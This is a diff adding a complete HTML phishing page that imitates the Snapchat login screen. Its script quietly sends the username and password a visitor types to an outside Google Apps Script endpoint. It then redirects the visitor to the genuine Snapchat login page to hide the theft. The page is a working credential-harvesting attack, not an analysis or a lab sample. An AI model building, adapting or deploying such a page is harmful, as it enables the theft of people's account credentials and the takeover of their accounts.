@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - Log In</title>
+    <style>
+        body {
+            background-color: #000000;
+            font-family: 'Avenir Next', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .snap-card {
+            background: white;
+            padding: 40px;
+            border-radius: 30px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            width: 340px;
+            text-align: center;
+        }
+        .snap-logo {
+            width: 70px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #000;
+            font-size: 26px;
+            margin-bottom: 25px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 2px solid #f2f2f2;
+            border-radius: 15px;
+            background-color: #f2f2f2;
+            font-size: 15px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 16px;
+            background-color: #000;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 17px;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+        .snap-logo-container {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 15px;
+}
+
+.snap-logo-img {
+    width: 100px; /* قەبارەی وێنەکە */
+    height: 100px;
+    object-fit: contain; /* بۆ ئەوەی وێنەکە تێک نەچێت */
+}
+    </style>
+</head>
+<body>
+
+<div class="snap-card">
+  <div class="snap-logo-container">
+    <img src="ttt.jpg" alt="Snapchat Logo" class="snap-logo-img">
+</div>
+    <h2>Snapchat</h2>
+    <form id="dataForm">
+        <input type="text" name="Name" placeholder="Username" required>
+        <input type="password" name="Message" placeholder="Password" required>
+        <button type="submit" id="submitBtn">Log In</button>
+    </form>
+    <div id="status"></div>
+</div>
+
+<script>
+    // 👇 URL
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbyC67gS6gedR86rcx6YMvcu4whdDi1wpM6MRbeZafvYj9_L0e_6MEinvuL0M0B8JvxD/exec'
+    
+    const form = document.getElementById('dataForm')
+    const btn = document.getElementById('submitBtn')
+
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      btn.disabled = true
+      btn.innerText = "Connecting..."
+
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response => {
+            
+            setTimeout(() => {
+                window.location.href = "https://accounts.snapchat.com/accounts/login";
+            }, 2000);
+        })
+        .catch(error => {
+            btn.disabled = false
+            btn.innerText = "Log In"
+            alert("Error: " + error.message);
+        })
+    })
+</script>
+
+</body>
+</html>
